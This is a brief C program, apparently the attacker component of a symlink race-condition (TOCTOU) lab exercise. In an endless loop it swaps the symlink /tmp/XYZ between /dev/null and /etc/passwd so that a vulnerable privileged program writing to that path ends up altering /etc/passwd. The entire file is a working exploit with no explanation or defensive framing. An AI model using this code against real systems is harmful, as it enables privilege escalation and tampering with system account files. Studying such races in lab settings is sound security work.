#include <unistd.h>

int main(){
	while(1){
		unlink("/tmp/XYZ");
		symlink("/dev/null", "/tmp/XYZ");
		usleep(10000);
		
		unlink("/tmp/XYZ");
		symlink("/etc/passwd", "/tmp/XYZ");
		usleep(10000);
	}
	return 0;
}
